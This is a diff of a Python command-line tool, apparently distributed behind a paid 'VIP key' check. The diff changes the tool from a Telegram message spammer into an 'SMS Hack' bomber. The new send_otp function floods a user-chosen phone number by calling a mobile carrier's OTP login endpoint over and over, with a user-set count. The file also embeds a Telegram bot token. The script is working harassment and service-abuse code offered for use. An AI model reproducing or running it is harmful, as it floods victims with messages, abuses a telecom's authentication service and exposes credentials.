@@ -1,55 +1,49 @@
 #!/usr/bin/env python3
-import requests, time, sys, hashlib, os, platform, subprocess, json
+import requests, time, sys, hashlib, os, platform, subprocess, json, random
 
+# --- CONFIGURATION ---
 BOT_TOKEN = "8700243285:AAEvVldxc_YeDqZ6FItFnWhcg-18kexzFnw"
 KEY_FILE = os.path.join(os.path.expanduser("~"), ".hack_vip_key.json")
 ONLINE_KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/moeyu/refs/heads/main/key.txt"
 
-def get_model():
-    try:
-        model = subprocess.getoutput('getprop ro.product.model').strip()
-        if not model or "not found" in model.lower():
-            model = platform.machine()
-        return model
-    except:
-        return platform.system()
+# Colors
+G, R, W, B, Y, C, M, X = "\033[1;32m", "\033[1;31m", "\033[1;37m", "\033[1;34m", "\033[1;33m", "\033[1;36m", "\033[1;35m", "\033[0m"
+
+def clear_screen(): os.system('cls' if platform.system() == 'Windows' else 'clear')
 
 def get_id():
     info = platform.processor() + platform.node() + platform.machine()
     return "DEV-" + hashlib.md5(info.encode()).hexdigest().upper()[:8]
 
 def banner():
-    os.system('clear')
-    print("\033[1;32m")
-    print(r"  _   _    _    ____ _  __    ____  __  __ ____  ")
-    print(r" | | | |  / \  / ___| |/ /   / ___||  \/  / ___| ")
-    print(r" | |_| | / _ \| |   | ' /    \___ \| |\/| \___ \ ")
-    print(r" |  _  |/ ___ \ |___| . \     ___) | |  | |___) |")
-    print(r" |_| |_/_/   \_\____|_|\_\   |____/|_|  |_|____/ ")
-    print("\n    >>> HACK SMS Tool <<<")
-    print("\033[1;37m" + "="*50)
+    clear_screen()
+    print(f"{G}")
+    print(r"  ____  __  __ ____  _  __   _   _    _    ____ _  __ ")
+    print(r" / ___||  \/  / ___|| |/ /  | | | |  / \  / ___| |/ / ")
+    print(r" \___ \| |\/| \___ \| ' /   | |_| | / _ \| |   | ' /  ")
+    print(r"  ___) | |  | |___) | . \   |  _  |/ ___ \ |___| . \  ")
+    print(r" |____/|_|  |_|____/|_|\_\  |_| |_/_/   \_\____|_|\_\ ")
+    print(f"\n          {Y}>>> {W}SMS Hack VIP Tool {Y}<<<{X}")
+    print(f"{W}╔══════════════════════════════════════════════════╗")
     d_id = get_id()
-    model = get_model()
-    print(f"[*] Device ID : \033[1;36m{d_id}\033[1;37m")
-    print(f"[*] Model     : {model}")
-    print("="*50 + "\033[0m")
-    return d_id, model
+    print(f"  {G}•{W} Device ID : {C}{d_id}{W}")
+    print(f"╚══════════════════════════════════════════════════╝{X}")
+    return d_id
 
 def check_online_keys(d_id):
     try:
         response = requests.get(ONLINE_KEY_URL, timeout=10)
         if response.status_code == 200:
-            valid_keys = [line.strip() for line in response.text.splitlines() if line.strip()]
-            for key in valid_keys:
+            keys = [line.strip() for line in response.text.splitlines() if line.strip()]
+            for key in keys:
                 if key.startswith("HACK-") and d_id in key:
                     return True, key
     except: pass
     return False, None
 
 def save_key(key):
-    data = {"key": key, "activated_at": time.time()}
     try:
-        with open(KEY_FILE, "w") as f: json.dump(data, f)
+        with open(KEY_FILE, "w") as f: json.dump({"key": key, "activated_at": time.time()}, f)
     except: pass
 
 def get_saved_key():
@@ -66,7 +60,7 @@ def is_key_valid(key_data, d_id):
     if not (key.startswith("HACK-") and d_id in key): return False
     try:
         days = int(key.split("-D")[-1])
-        if time.time() < (activated_at + (days * 86400)): return True
+        return time.time() < (activated_at + (days * 86400))
     except: pass
     return False
 
@@ -75,54 +69,51 @@ def auth(d_id):
     if online_valid:
         save_key(key)
         return True
+    
     saved = get_saved_key()
     if is_key_valid(saved, d_id): return True
-    while True:
-        key = input("\n[?] Enter VIP Key: ").strip()
-        if key.startswith("HACK-") and d_id in key:
-            save_key(key)
-            print("\033[1;32m[+] Key Accepted!\033[0m")
-            time.sleep(1)
-            return True
-        print("\033[1;31m[!] Invalid Key!\033[0m")
-
-def send_love_msg(chat_id, count):
-    print(f"\n[*] Sending {count} messages to {chat_id}...")
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    for i in range(count):
-        try:
-            requests.post(url, data={"chat_id": chat_id, "text": "ချစ်တယ်ကွာ❤ အာဘွား😘"})
-            print(f"[{i+1}/{count}] Sent")
-        except: print(f"[{i+1}/{count}] Failed")
-        time.sleep(0.5)
-    input("\nPress Enter to return...")
-
-def show_key_info(d_id):
-    saved = get_saved_key()
-    print("\n" + "="*35)
-    if is_key_valid(saved, d_id):
-        key = saved["key"]
-        days = int(key.split("-D")[-1])
-        expiry_time = saved["activated_at"] + (days * 86400)
-        rem = expiry_time - time.time()
-        print(f"[*] Key: {key}\n[*] Status: Active\n[*] Expire: {int(rem//86400)}D {int((rem%86400)//3600)}H")
-    else: print("\033[1;31m[!] No active key.\033[0m")
-    input("\nPress Enter...")
-
-def main_menu(d_id, model):
+        
     while True:
         banner()
-        print(" [1] Send Love Message\n [2] View VIP Key\n [0] Exit")
-        choice = input("\n[?] Option: ").strip()
+        print(f"{Y}[!] Online Auth Failed. Local Key Required.{X}")
+        key = input(f"\n{W}[?]{G} Enter VIP Key: {W}").strip()
+        if key.startswith("HACK-") and d_id in key:
+            save_key(key)
+            print(f"{G}[+] Key Accepted!{X}")
+            time.sleep(1)
+            return True
+        print(f"{R}[!] Invalid Key!{X}")
+        time.sleep(2)
+
+def send_otp(p, c):
+    url = "https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber={}"
+    print(f"\n{W}[*] Starting SMS Hack for {C}{p}{W}...")
+    for i in range(c):
+        try: requests.get(url.format(p), timeout=5)
+        except: pass
+        print(f"[{i+1}/{c}] Sent", end="\r")
+        time.sleep(0.1)
+    print(f"\n{G}[+] Process Finished!{X}")
+    input(f"\n{W}Press Enter to return...{X}")
+
+def main_menu(d_id):
+    while True:
+        banner()
+        print(f" {G}[1]{W} Start SMS Hack\n {G}[2]{W} Check Status\n {R}[0]{W} Exit")
+        choice = input(f"\n{W}[?]{G} Option: {W}").strip()
         if choice == '1':
-            chat_id = input("\n[?] Target Chat ID: ")
-            try: send_love_msg(chat_id, int(input("[?] Count: ")))
+            p = input(f"{W}[?] Target Phone: {C}")
+            try: send_otp(p, int(input(f"{W}[?] Count: ")))
             except: pass
-        elif choice == '2': show_key_info(d_id)
+        elif choice == '2':
+            saved = get_saved_key()
+            if is_key_valid(saved, d_id): print(f"{G}[*] Status: Active{X}")
+            else: print(f"{R}[!] Status: Inactive{X}")
+            input(f"\n{W}Press Enter...{X}")
         elif choice == '0': sys.exit()
 
 if __name__ == '__main__':
     try:
-        d_id, model = banner()
-        if auth(d_id): main_menu(d_id, model)
+        d_id = banner()
+        if auth(d_id): main_menu(d_id)
     except KeyboardInterrupt: sys.exit()
